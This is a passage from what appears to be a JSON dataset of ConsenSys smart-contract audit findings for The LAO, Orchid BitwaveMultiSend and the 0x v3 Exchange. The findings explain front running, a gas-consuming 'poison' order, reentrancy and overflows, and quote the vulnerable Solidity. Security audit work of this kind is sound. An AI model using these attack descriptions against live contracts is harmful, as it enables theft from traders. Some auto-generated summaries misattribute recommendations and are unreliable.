      "content": "#### Resolution\n\n\n\n`safeRagequit` no longer exists in the Pull Pattern update. `ragequit` is considered safe as there are no longer any ERC20 transfers in its code flow.\n\n\n#### Description\n\n\n`safeRagequit` and `ragequit` functions are used for withdrawing funds from the LAO. The difference between them is that `ragequit` function tries to withdraw all the allowed tokens and `safeRagequit` function withdraws only some subset of these tokens, defined by the user. It’s needed in case the user or GuildBank is blacklisted in some of the tokens and the transfer reverts. The problem is that even though you can quit in that case, you’ll lose the tokens that you exclude from the list.\n\n\nTo be precise, the tokens are not completely lost, they will belong to the LAO and can still potentially be transferred to the user who quit. But that requires a lot of trust, coordination, time and anyone can steal some part of these tokens.\n\n\n#### Recommendation\n\n\nImplementing pull pattern for token withdrawals should solve the issue. Users will be able to quit the LAO and burn their shares but still keep their tokens in the LAO’s contract for some time if they can’t withdraw them right now.",
      "summary": "\nThe bug report describes an issue with two functions, `safeRagequit` and `ragequit`, used for withdrawing funds from the LAO (Liquidity Autonomous Organization). `safeRagequit` withdraws only some subset of tokens defined by the user, while `ragequit` tries to withdraw all allowed tokens. The problem is that if a user or GuildBank is blacklisted in some of the tokens and the transfer reverts, the excluded tokens are not completely lost, but belong to the LAO and can still potentially be transferred to the user who quit. This requires a lot of trust, coordination, and time, and anyone can steal some part of these tokens. The recommendation is to implement a pull pattern for token withdrawals in order to solve the issue. This would allow users to quit the LAO and burn their shares but still keep their tokens in the LAO's contract for some time if they can't withdraw them right now.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "The LAO",
      "source_link": "https://consensys.net/diligence/audits/2020/01/the-lao/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sergii Kravchenko",
        "Shayan Eskandari",
        " Daniel Luca"
      ]
    },
    {
      "id": "13819",
      "title": "Inadequate use of assert",
      "impact": "LOW",
      "content": "#### Description\n\n\nThe usage of `require` vs `assert` has always been a matter of discussion because of the fine lines distinguishing these transaction-terminating expressions.\n\n\nHowever, the usage of the `assert` syntax in this case is not the most appropriate.\n\n\nBorrowing the explanation from the latest solidity docs (v. <https://solidity.readthedocs.io/en/latest/control-structures.html#id4>) :\n\n\n\n```\nThe assert function should only be used to test for internal errors, and to check invariants. \r\n\n```\nSince assert-style exceptions (using the `0xfe` opcode) consume all gas available to the call and require-style ones (using the `0xfd` opcode) do not since the Metropolis release when the `REVERT` instruction was added, the usage of `require` in the lines depicted in the examples section would only result in gas savings and the same security assumptions.\n\n\nIn this case, even though the calls are being made to external contracts the *supposedly* abide to a predefined specification, this is by no means an invariant of the presented system since the component is external to the built system and its integrity cannot be formally verified.\n\n\n#### Examples\n\n\n**code/BitwaveMultiSend.sol:L34**\n\n\n\n```\nassert(\\_to[i].send(\\_value[i]));\n\n```\n**code/BitwaveMultiSend.sol:L40**\n\n\n\n```\nassert(msg.sender.send(remainingValue));\n\n```\n**code/BitwaveMultiSend.sol:L55**\n\n\n\n```\nassert(token.transferFrom(msg.sender, \\_to[i], \\_value[i]) == true);\n\n```\n#### Recommendation\n\n\nExchange the `assert` statements for `require` ones.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Orchid BitwaveMultiSend",
      "source_link": "https://consensys.net/diligence/audits/2020/01/orchid-bitwavemultisend/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Gonçalo Sá\n"
      ]
    },
    {
      "id": "13818",
      "title": "Unneeded type cast of contract type",
      "impact": "LOW",
      "content": "#### Description\n\n\nThe typecast being done on the `address` parameter in the lien below is unneeded.\n\n\n**code/BitwaveMultiSend.sol:L51**\n\n\n\n```\nERC20 token = ERC20(\\_tokenAddress);\n\n```\n#### Recommendation\n\n\nAssign the right type at the function parameter definition like so:\n\n\n\n```\n    function sendErc20(ERC20 _tokenAddress, address[] memory _to, uint256[] memory _value) public restrictedToOwner returns (bool _success) {\r\n\n```",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Orchid BitwaveMultiSend",
      "source_link": "https://consensys.net/diligence/audits/2020/01/orchid-bitwavemultisend/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Gonçalo Sá\n"
      ]
    },
    {
      "id": "13817",
      "title": "Ether send function remainder handling",
      "impact": "LOW",
      "content": "#### Description\n\n\nThe Ether send function depicted below implements logic to reimburse the sender if an extraneous amount is left in the contract after the disbursement.\n\n\n**code/BitwaveMultiSend.sol:L22-L43**\n\n\n\n```\nfunction sendEth(address payable [] memory \\_to, uint256[] memory \\_value) public restrictedToOwner payable returns (bool \\_success) {\n    // input validation\n    require(\\_to.length == \\_value.length);\n    require(\\_to.length <= 255);\n\n    // count values for refunding sender\n    uint256 beforeValue = msg.value;\n    uint256 afterValue = 0;\n\n    // loop through to addresses and send value\n    for (uint8 i = 0; i < \\_to.length; i++) {\n        afterValue = afterValue.add(\\_value[i]);\n        assert(\\_to[i].send(\\_value[i]));\n    }\n\n    // send back remaining value to sender\n    uint256 remainingValue = beforeValue.sub(afterValue);\n    if (remainingValue > 0) {\n        assert(msg.sender.send(remainingValue));\n    }\n    return true;\n}\n\n```\nIt is also the only place where the `SafeMath` dependency is being used. More specifically to check there was no underflow in the arithmetic adding up the disbursed amounts.\n\n\nHowever, since the individual sends would revert themselves should more Ether than what was available in the balance be specified these protection measures seem unnecessary.\n\n\nNot only the above is true but the current codebase does not allow to take funds locked within the contract out in the off chance someone forced funds into this smart contract (e.g., by self-destructing some other smart contract containing funds into this one).\n\n\n#### Recommendation\n\n\nThe easiest way to handle both retiring `SafeMath` and returning locked funds would be to phase out all the intra-function arithmetic and just transferring `address(this).balance` to `msg.sender` at the end of the disbursement.\nSince all the funds in there are meant to be from the caller of the function this serves the purpose of returning extraneous funds to him well and, adding to that, it allows for some front-running fun if someone “self-destructed” funds to this smart contract by mistake.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Orchid BitwaveMultiSend",
      "source_link": "https://consensys.net/diligence/audits/2020/01/orchid-bitwavemultisend/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Gonçalo Sá\n"
      ]
    },
    {
      "id": "13816",
      "title": "Improve function visibility",
      "impact": "LOW",
      "content": "#### Description\n\n\nThe following methods are not called internally in the token contract and visibility can, therefore, be restricted to `external` rather than `public`. This is more gas efficient because less code is emitted and data does not need to be copied into memory. It also makes functions a bit simpler to reason about because there’s no need to worry about the possibility of internal calls.\n\n\n* `BitwaveMultiSend.sendEth()`\n* `BitwaveMultiSend.sendErc20()`\n\n\n#### Recommendation\n\n\nChange visibility of these methods to `external`.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Orchid BitwaveMultiSend",
      "source_link": "https://consensys.net/diligence/audits/2020/01/orchid-bitwavemultisend/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Gonçalo Sá\n"
      ]
    },
    {
      "id": "13998",
      "title": "NSignatureTypes enum value bypasses Solidity safety checks  Won't Fix",
      "impact": "LOW",
      "content": "#### Resolution\n\n\n\nFrom the development team:\n\n\n\n> \n> This has been left unchanged in order to provide more context with a revert when an invalid signature type is used.\n> \n> \n> \n\n\n\n\n#### Description\n\n\nThe `ISignatureValidator` contract defines an enum `SignatureType` to represent the different types of signatures recognized within the exchange. The final enum value, `NSignatureTypes`, is not a valid signature type. Instead, it is used by `MixinSignatureValidator` to check that the value read from the signature is a valid enum value. However, Solidity now includes its own check for enum casting, and casting a value over the maximum enum size to an enum is no longer possible.\n\n\nBecause of the added `NSignatureTypes` value, Solidity’s check now recognizes `0x08` as a valid `SignatureType` value.\n\n\n#### Examples\n\n\nThe check is made here:\n\n\n**code/contracts/exchange/contracts/src/MixinSignatureValidator.sol:L441-L449**\n\n\n\n```\n// Ensure signature is supported\nif (uint8(signatureType) >= uint8(SignatureType.NSignatureTypes)) {\n    LibRichErrors.rrevert(LibExchangeRichErrors.SignatureError(\n        LibExchangeRichErrors.SignatureErrorCodes.UNSUPPORTED,\n        hash,\n        signerAddress,\n        signature\n    ));\n}\n\n```\n#### Recommendation\n\n\nThe check should be removed, as should the `SignatureTypes.NSignatureTypes` value.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "0x v3 Exchange",
      "source_link": "https://consensys.net/diligence/audits/2019/09/0x-v3-exchange/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sergii Kravchenko",
        " Alex Wade",
        "Steve Marx"
      ]
    },
    {
      "id": "13997",
      "title": "Several overflows in LibBytes ✓ Addressed",
      "impact": "LOW",
      "content": "#### Resolution\n\n\n\nThis is addressed in [0xProject/0x-monorepo#2265](https://github.com/0xProject/0x-monorepo/pull/2265). Unused functions have been removed. The remaining functions are only used with safe parameters (ones guaranteed not to overflow).\n\n\n#### Description\n\n\nSeveral functions in `LibBytes` have integer overflows.\n\n\n#### Examples\n\n\n`LibBytes.readBytesWithLength` returns a pointer to a `bytes` array within an existing `bytes` array at some given `index`. The length of the nested array is added to the given `index` and checked against the parent array to ensure the data in the nested array is within the bounds of the parent. However, because the addition can overflow, the bounds check can be bypassed to return an array that points to data out of bounds of the parent array.\n\n\n**code/contracts/utils/contracts/src/LibBytes.sol:L546-L553**\n\n\n\n```\nif (b.length < index + nestedBytesLength) {\n    LibRichErrors.rrevert(LibBytesRichErrors.InvalidByteOperationError(\n        LibBytesRichErrors\n            .InvalidByteOperationErrorCodes.LengthGreaterThanOrEqualsNestedBytesLengthRequired,\n        b.length,\n        index + nestedBytesLength\n    ));\n}\n\n```\nThe following functions have similar issues:\n\n\n* `readAddress`\n* `writeAddress`\n* `readBytes32`\n* `writeBytes32`\n* `readBytes4`\n\n\n#### Recommendation\n\n\nAn overflow check should be added to the function. Alternatively, because `readBytesWithLength` does not appear to be used anywhere in the 0x project, the function should be removed from `LibBytes`. Additionally, the following functions in `LibBytes` are also not used and should be considered for removal:\n\n\n* `popLast20Bytes`\n* `writeAddress`\n* `writeBytes32`\n* `writeUint256`\n* `writeBytesWithLength`\n* `deepCopyBytes`",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "0x v3 Exchange",
      "source_link": "https://consensys.net/diligence/audits/2019/09/0x-v3-exchange/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sergii Kravchenko",
        " Alex Wade",
        "Steve Marx"
      ]
    },
    {
      "id": "13996",
      "title": "Modifier ordering plays a significant role in modifier efficacy ✓ Fixed",
      "impact": "LOW",
      "content": "#### Resolution\n\n\n\nThis is fixed in [0xProject/0x-monorepo#2228](https://github.com/0xProject/0x-monorepo/pull/2228) by introducing a new modifier that combines the two: `refundFinalBalance`.\n\n\n#### Description\n\n\nThe `nonReentrant` and `refundFinalBalance` modifiers always appear together across the 0x monorepo. When used, they invariably appear with `nonReentrant` listed first, followed by `refundFinalBalance`. This specific order appears inconsequential at first glance but is actually important. The order of execution is as follows:\n\n\n1. The `nonReentrant` modifier runs (`_lockMutexOrThrowIfAlreadyLocked`).\n2. If `refundFinalBalance` had a prefix, it would run now.\n3. The function itself runs.\n4. The `refundFinalBalance` modifier runs (`_refundNonZeroBalanceIfEnabled`).\n5. The `nonReentrant` modifier runs (`_unlockMutex`).\n\n\nThe fact that the `refundFinalBalance` modifier runs before the mutex is unlocked is of particular importance because it potentially invokes an external call, which may reenter. If the order of the two modifiers were flipped, the mutex would unlock *before* the external call, defeating the purpose of the reentrancy guard.\n\n\n#### Examples\n\n\n**code/contracts/exchange/contracts/src/MixinExchangeCore.sol:L64-L65**\n\n\n\n```\nnonReentrant\nrefundFinalBalance\n\n```\n#### Recommendation\n\n\nAlthough the order of the modifiers is correct as-is, this pattern introduces cognitive overhead when making or reviewing changes to the 0x codebase. Because the two modifiers always appear together, it may make sense to combine the two into a single modifier where the order of operations is explicit.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "0x v3 Exchange",
      "source_link": "https://consensys.net/diligence/audits/2019/09/0x-v3-exchange/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sergii Kravchenko",
        " Alex Wade",
        "Steve Marx"
      ]
    },
    {
      "id": "13995",
      "title": "Front running market orders  Won't Fix",
      "impact": "LOW",
      "content": "#### Resolution\n\n\n\nFrom the development team:\n\n\n\n> \n> * Front-running is typically prevented with a combination of external contracts and various off-chain mechanics.\n> * Users should always understand the risk of using market orders in any market or exchange structure. Although they increase convenience and arguably have a better UX, they almost always carry more risk than other order types.\n> * Users can always enforce a worst price by padding a market fill with an appropriate number of orders that do not exceed the worst acceptable price.\n> \n> \n> \n\n\n\n\n#### Description\n\n\n`MixinWrapperFunctions` defines a number of functions for market buy/sell orders. These functions take a list of orders and a target asset amount to buy or sell. They fill each order in turn until the target has been reached.\n\n\nThese functions provide an appealing opportunity for front running because of the near-guaranteed profit to be had. This is most easily explained with an example:\n\n\n1. Alice wishes to buy 10 FOO tokens. She creates a market buy order to purchase tokens first from Bob, who is selling 4 FOO tokens at $9 each, and then from Eve, who is selling 20 tokens at $10 each.\n2. Eve front runs this market order with a transaction that buys all 4 FOO tokens from Bob for $9 each.\n3. Alice’s transaction goes through, but because Bob’s inventory has been depleted, all 10 FOO tokens are purchased from Eve at a price of $10 each. By front running, Eve gained $4.\n\n\nIn a more traditional front running scheme, Alice would have just been trying to make a simple purchase of FOO tokens at $9 each, and Eve would be taking on non-trivial risk by buying them first and hoping Alice (or another buyer) would be willing to pay a higher price later.\n\n\nWith a market order, however, Eve’s front running is nearly risk free because she knows the market order already commits Alice to buying at the higher price.\n\n\n#### Recommendation\n\n\nFor the most part, traders will simply have to understand the risks of market orders and take care to only authorize trades they will be happy with.\n\n\nThat said, each order in a market order could specify a maximum quantity, e.g. “I want 10 FOO tokens, and I’m willing to buy up to 10 from Bob but only up to 5 from Eve.” This would limit the trader’s exposure to increased prices due to front running, but it would retain the convenience and efficiency of market orders.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "0x v3 Exchange",
      "source_link": "https://consensys.net/diligence/audits/2019/09/0x-v3-exchange/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sergii Kravchenko",
        " Alex Wade",
        "Steve Marx"
      ]
    },
    {
      "id": "13994",
      "title": "By manipulating the gas limit, relayers can affect the outcome of ZeroExTransactions  Won't Fix",
      "impact": "LOW",
      "content": "#### Resolution\n\n\n\nFrom the development team:\n\n\n\n> \n> While this is an annoyance when used in combination with `marketBuyOrdersNoThrow` and `marketSellOrdersNoThrow`, it does not seem worth it to add a `gasLimit` to 0x transactions for this reason alone. Instead, this quirk should be documented along with a recommendation to use the `fillOrKill` variants of each market fill function when used in combination with 0x transactions.\n> \n> \n> \n\n\n\n\n#### Description\n\n\n`ZeroExTransaction`s are meta transactions supported by the `Exchange`. They do not require that they are executed with a specific amount of gas, so the transaction relayer can choose how much gas to provide. By choosing a low gas limit, a relayer can affect the outcome of the transaction.\n\n\nA `ZeroExTransaction` specifies a signer, an expiration, and call data for the transaction:\n\n\n**code/contracts/exchange-libs/contracts/src/LibZeroExTransaction.sol:L41-L47**\n\n\n\n```\nstruct ZeroExTransaction {\n    uint256 salt;                   // Arbitrary number to ensure uniqueness of transaction hash.\n    uint256 expirationTimeSeconds;  // Timestamp in seconds at which transaction expires.\n    uint256 gasPrice;               // gasPrice that transaction is required to be executed with.\n    address signerAddress;          // Address of transaction signer.\n    bytes data;                     // AbiV2 encoded calldata.\n}\n\n```\nIn `MixinTransactions._executeTransaction()`, all available gas is forwarded in the delegate call, and the transaction is marked as executed:\n\n\n**code/contracts/exchange/contracts/src/MixinTransactions.sol:L107-L108**\n\n\n\n```\ntransactionsExecuted[transactionHash] = true;\n(bool didSucceed, bytes memory returnData) = address(this).delegatecall(transaction.data);\n\n```\n#### Examples\n\n\nA likely attack vector for this is front running a `ZeroExTransaction` that ultimately invokes `_fillNoThrow()`. In this scenario, an attacker sees the call to `executeTransaction()` and makes their own call with a lower gas limit, causing the order being filled to run out of gas but allowing the transaction as a whole to succeed.\n\n\nIf such an attack is successful, the `ZeroExTransaction` cannot be replayed, so the signer must produce a new signature and try again, ad infinitum.\n\n\n#### Recommendation\n\n\nAdd a `gasLimit` field to `ZeroExTransaction` and forward exactly that much gas via `delegatecall`. (Note that you must explicitly check that sufficient gas is available because the EVM allows you to supply a gas parameter that exceeds the actual remaining gas.)",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "0x v3 Exchange",
      "source_link": "https://consensys.net/diligence/audits/2019/09/0x-v3-exchange/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sergii Kravchenko",
        " Alex Wade",
        "Steve Marx"
      ]
    },
    {
      "id": "13993",
      "title": "Anyone can front run MixinExchangeCore.cancelOrder()  Won't Fix",
      "impact": "MEDIUM",
      "content": "#### Resolution\n\n\n\nFrom the development team:\n\n\n\n> \n> * Front-running is typically prevented with a combination of external contracts and various off-chain mechanics.\n> * It is not possible to cancel an order by providing less data to the `cancelOrder` function without drastically changing the logic of the fill functions. However, this type of behavior could possibly be enforced by using external contracts that are set to the `senderAddress` of the related orders.\n> \n> \n> \n\n\n\n\n#### Description\n\n\nIn order to cancel an order, an authorized address (maker or sender) calls `cancelOrder(LibOrder.Order memory order)`. When calling that function, all data for the order becomes visible to everyone on the network, and anyone can fill that order before it’s canceled.\n\n\nUsually, a maker is canceling an order because it’s no longer profitable for them, so an attacker is likely to profit from front running the `cancelOrder()` transaction.\n\n\n#### Recommendation\n\n\nMake it impossible to front run order cancelation by providing less data to the `cancelOrder()` function such that this data is insufficient to execute the order.",
      "summary": "\nThis bug report is about the risk of front-running when cancelling orders on a blockchain network using the `cancelOrder()` function. Front-running is when someone is able to gain an advantage over other traders by seeing the order before it is cancelled and acting on it. The issue is that when calling the `cancelOrder()` function, all data for the order becomes visible to everyone on the network, allowing anyone to fill the order before it is cancelled. \n\nThe development team has suggested that this type of behavior could be prevented by using external contracts that are set to the `senderAddress` of the related orders. They have also recommended that it should be made impossible to front run order cancelation by providing less data to the `cancelOrder()` function such that this data is insufficient to execute the order.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "0x v3 Exchange",
      "source_link": "https://consensys.net/diligence/audits/2019/09/0x-v3-exchange/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sergii Kravchenko",
        " Alex Wade",
        "Steve Marx"
      ]
    },
    {
      "id": "13992",
      "title": "The Exchange owner should not be able to call executeTransaction or batchExecuteTransaction  Won't Fix",
      "impact": "MEDIUM",
      "content": "#### Resolution\n\n\n\nFrom the development team:\n\n\n\n> \n> While this is a minor inconsistency in the logic of these functions, it is in no way dangerous. `currentContextAddress` is not used when calling any admin functions, so the address of the transaction signer will be completely disregarded.\n> \n> \n> \n\n\n\n\n#### Description\n\n\nIf the owner calls either of these functions, the resulting `delegatecall` can pass `onlyOwner` modifiers even if the transaction signer is not the owner. This is because, regardless of the `contextAddress` set through `_executeTransaction`, the `onlyOwner` modifier checks `msg.sender`.\n\n\n#### Examples\n\n\n1. `_executeTransaction` sets the context address to the signer address, which is not `msg.sender` in this case:\n\n\n**code/contracts/exchange/contracts/src/MixinTransactions.sol:L102-L104**\n\n\n\n```\n// Set the current transaction signer\naddress signerAddress = transaction.signerAddress;\n\\_setCurrentContextAddressIfRequired(signerAddress, signerAddress);\n\n```\n2. The resulting `delegatecall` could target an admin function like this one:\n\n\n**code/contracts/exchange/contracts/src/MixinAssetProxyDispatcher.sol:L38-L61**\n\n\n\n```\n/// @dev Registers an asset proxy to its asset proxy id.\n/// Once an asset proxy is registered, it cannot be unregistered.\n/// @param assetProxy Address of new asset proxy to register.\nfunction registerAssetProxy(address assetProxy)\n    external\n    onlyOwner\n{\n    // Ensure that no asset proxy exists with current id.\n    bytes4 assetProxyId = IAssetProxy(assetProxy).getProxyId();\n    address currentAssetProxy = \\_assetProxies[assetProxyId];\n    if (currentAssetProxy != address(0)) {\n        LibRichErrors.rrevert(LibExchangeRichErrors.AssetProxyExistsError(\n            assetProxyId,\n            currentAssetProxy\n        ));\n    }\n  \n    // Add asset proxy and log registration.\n    \\_assetProxies[assetProxyId] = assetProxy;\n    emit AssetProxyRegistered(\n        assetProxyId,\n        assetProxy\n    );\n}\n\n```\n3. The `onlyOwner` modifier does not check the context address, but checks `msg.sender`:\n\n\n**code/contracts/utils/contracts/src/Ownable.sol:L35-L45**\n\n\n\n```\nfunction \\_assertSenderIsOwner()\n    internal\n    view\n{\n    if (msg.sender != owner) {\n        LibRichErrors.rrevert(LibOwnableRichErrors.OnlyOwnerError(\n            msg.sender,\n            owner\n        ));\n    }\n}\n\n```\n\n\n#### Recommendation\n\n\nAdd a check to `_executeTransaction` that prevents the owner from calling this function.",
      "summary": "\nThis bug report describes an issue with functions in the MixinTransactions and MixinAssetProxyDispatcher contracts. The issue is that if the owner calls either of these functions, the resulting `delegatecall` can pass `onlyOwner` modifiers even if the transaction signer is not the owner. This is because, regardless of the `contextAddress` set through `_executeTransaction`, the `onlyOwner` modifier checks `msg.sender`. The development team has determined that this is a minor inconsistency in the logic of these functions, and is not dangerous. The recommendation is to add a check to `_executeTransaction` to prevent the owner from calling this function.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "0x v3 Exchange",
      "source_link": "https://consensys.net/diligence/audits/2019/09/0x-v3-exchange/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sergii Kravchenko",
        " Alex Wade",
        "Steve Marx"
      ]
    },
    {
      "id": "13991",
      "title": "Front running in matchOrders()  Won't Fix",
      "impact": "MEDIUM",
      "content": "#### Resolution\n\n\n\nFrom the development team:\n\n\n\n> \n> * Front-running is typically prevented with a combination of external contracts and various off-chain mechanics.\n> * These functions are primarily intended to be used with “matching relayers”. In this model, orders must set their `takerAddress` or `senderAddress` to the address of the matcher, who is the only party allowed to actually fill the orders. This prevents any other address from participating in a gas auction.\n> * A commit-reveal scheme would be difficult to take advantage of in practice, since orders could be filled through a number of other functions on the `Exchange` contract. All of these functions would have to adhere to the commit-reveal scheme in order to be effective.\n> \n> \n> \n\n\n\n\n#### Description\n\n\nCalls to `matchOrders()` are made to extract profit from the price difference between two opposite orders: left and right.\n\n\n**code/contracts/exchange/contracts/src/MixinMatchOrders.sol:L106-L111**\n\n\n\n```\nfunction matchOrders(\n    LibOrder.Order memory leftOrder,\n    LibOrder.Order memory rightOrder,\n    bytes memory leftSignature,\n    bytes memory rightSignature\n)\n\n```\nThe caller only pays protocol and transaction fees, so it’s almost always profitable to front run every call to `matchOrders()`. That would lead to gas auctions and would make `matchOrders()` difficult to use.\n\n\n#### Recommendation\n\n\nConsider adding a commit-reveal scheme to `matchOrders()` to stop front running altogether.",
      "summary": "\nThis bug report is about the potential for front-running when using the `matchOrders()` function of the Exchange contract. Front-running is a type of attack that occurs when someone is able to take advantage of the price difference between two opposite orders (left and right) in order to make a profit. The caller only pays protocol and transaction fees, so it’s almost always profitable to front run every call to `matchOrders()`. This would lead to gas auctions and would make `matchOrders()` difficult to use.\n\nThe development team has suggested using a combination of external contracts and off-chain mechanics to prevent front-running, as well as using a “matching relayer” model, where orders must set their `takerAddress` or `senderAddress` to the address of the matcher, who is the only party allowed to actually fill the orders.\n\nThe team also suggests using a commit-reveal scheme, which would make it difficult to take advantage of in practice, since orders could be filled through a number of other functions on the `Exchange` contract. All of these functions would have to adhere to the commit-reveal scheme in order to be effective.\n\nOverall, the recommendation is to consider adding a commit-reveal scheme to `matchOrders()` to stop front running altogether.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "0x v3 Exchange",
      "source_link": "https://consensys.net/diligence/audits/2019/09/0x-v3-exchange/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sergii Kravchenko",
        " Alex Wade",
        "Steve Marx"
      ]
    },
    {
      "id": "13990",
      "title": "“Poison” order that consumes gas can block market trades  Won't Fix",
      "impact": "MEDIUM",
      "content": "#### Resolution\n\n\n\nFrom the development team:\n\n\n\n> \n> This can be prevented fairly easily by performing an `eth_call` off-chain before attempting to fill any orders (which is pretty standard practice). Hard coding gas limits reduces flexibility and may ultimately prevent some use cases from developing in the future.\n> \n> \n> \n\n\n(Note from the audit team: Hardcoding is not necessary. A parameter would do.)\n\n\n\n\n#### Description\n\n\nThe market buy/sell functions gather a list of orders together for the same asset and try to fill them in order until a target amount has been traded.\n\n\nThese functions use `MixinWrapperFunctions._fillOrderNoThrow()` to attempt to fill each order but ignore failures. This way, if one order is unfillable for some reason, the overall market order can still succeed by filling other orders.\n\n\nOrders can still force `_fillOrderNoThrow()` to revert by using an external contract for signature validation and having that contract consume all available gas.\n\n\nThis makes it possible to advertise a “poison” order for a low price that will block all market orders from succeeding. It’s reasonable to assume that off-chain order books will automatically include the best prices when constructing market orders, so this attack would likely be quite effective. Note that such an attack costs the attacker nothing because all they need is an on-chain contract that consumers all available gas (maybe via an `assert`). This makes it a very appealing attack vector for, e.g., an order book that wants to temporarily disable a competitor.\n\n\n#### Details\n\n\n`_fillOrderNoThrow()` forwards all available gas when filling the order:\n\n\n**code/contracts/exchange/contracts/src/MixinWrapperFunctions.sol:L340-L348**\n\n\n\n```\n// ABI encode calldata for `fillOrder`\nbytes memory fillOrderCalldata = abi.encodeWithSelector(\n    IExchangeCore(address(0)).fillOrder.selector,\n    order,\n    takerAssetFillAmount,\n    signature\n);\n\n(bool didSucceed, bytes memory returnData) = address(this).delegatecall(fillOrderCalldata);\n\n```\nSimilarly, when the `Exchange` attempts to fill an order that requires external signature validation (`Wallet`, `Validator`, or `EIP1271Wallet` signature types), it forwards all available gas:\n\n\n**code/contracts/exchange/contracts/src/MixinSignatureValidator.sol:L642**\n\n\n\n```\n(bool didSucceed, bytes memory returnData) = verifyingContractAddress.staticcall(callData);\n\n```\nIf the verifying contract consumes all available gas, it can force the overall transaction to revert.\n\n\n#### Pedantic Note\n\n\nTechnically, it’s impossible to consume *all* remaining gas when called by another contract because the EVM holds back a small amount, but even at the block gas limit, the amount held back would be insufficient to complete the transaction.\n\n\n#### Recommendation\n\n\nConstrain the gas that is forwarded during signature validation. This can be constrained either as a part of the signature or as a parameter provided by the taker.",
      "summary": "\nThis bug report is about a vulnerability in the market buy/sell functions of a system that performs an `eth_call` off-chain before attempting to fill any orders. This vulnerability allows attackers to advertise a \"poison\" order for a low price that will block all market orders from succeeding. This attack costs the attacker nothing and is very appealing for someone who wants to temporarily disable a competitor. \n\nThe issue is that when `_fillOrderNoThrow()` or the `Exchange` attempts to fill an order that requires external signature validation, it forwards all available gas. This allows the verifying contract to consume all available gas and force the overall transaction to revert. \n\nThe development team recommends constraining the gas that is forwarded during signature validation, either as a part of the signature or as a parameter provided by the taker. The audit team notes that hardcoding is not necessary and a parameter would do.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "0x v3 Exchange",
      "source_link": "https://consensys.net/diligence/audits/2019/09/0x-v3-exchange/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sergii Kravchenko",
        " Alex Wade",
        "Steve Marx"
      ]
    },
    {
      "id": "13989",
      "title": "Reentrancy in executeTransaction()  Won't Fix",
      "impact": "MEDIUM",
      "content": "#### Resolution\n\n\n\nFrom the development team:\n\n\n\n> \n> * Reentrancy would be dangerous in `executeTransaction` if combined with updating the `currentContextAddress`. However, this is is prevented by checking `currentContextAddress_ != address(0)` when validating a transaction.\n> * `executeTransaction` also inherits a lot of the safety from the reentrancy protection on other individual functions in the `Exchange` contract.\n> * Setting `transactionsExecuted` before making the `delegatecall` also prevents the same transaction from being executed multiple times.\n> \n> \n> \n\n\n\n\n#### Description\n\n\nIn `MixinTransactions`, `executeTransaction()` and `batchExecuteTransactions()` do not have the `nonReentrant` modifier. Because of that, it is possible to execute nested transactions or call these functions during other reentrancy attacks on the exchange. The reason behind that decision is to be able to call functions with `nonReentrant` modifier as delegated transactions.\n\n\nNested transactions are partially prevented with a separate check that does not allow transaction execution if the exchange is currently in somebody else’s context:\n\n\n**code/contracts/exchange/contracts/src/MixinTransactions.sol:L155-L162**\n\n\n\n```\n// Prevent `executeTransaction` from being called when context is already set\naddress currentContextAddress\\_ = currentContextAddress;\nif (currentContextAddress\\_ != address(0)) {\n    LibRichErrors.rrevert(LibExchangeRichErrors.TransactionInvalidContextError(\n        transactionHash,\n        currentContextAddress\\_\n    ));\n}\n\n```\nThis check still leaves some possibility of reentrancy. Allowing that behavior is dangerous and may create possible attack vectors in the future.\n\n\n#### Recommendation\n\n\nAdd a new modifier to `executeTransaction()` and `batchExecuteTransactions()` which is similar to `nonReentrant` but uses different storage slot.",
      "summary": "\nThe bug report describes a potential vulnerability in the MixinTransactions contract of the Exchange contract. The vulnerability is that the `executeTransaction()` and `batchExecuteTransactions()` functions do not have the `nonReentrant` modifier, which could allow for nested transactions or reentrancy attacks. This leaves the Exchange contract open to potential attack vectors in the future. To prevent this, the development team recommends adding a new modifier to `executeTransaction()` and `batchExecuteTransactions()` which is similar to `nonReentrant` but uses a different storage slot. This should prevent any potential nested transactions or reentrancy attacks on the Exchange contract.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
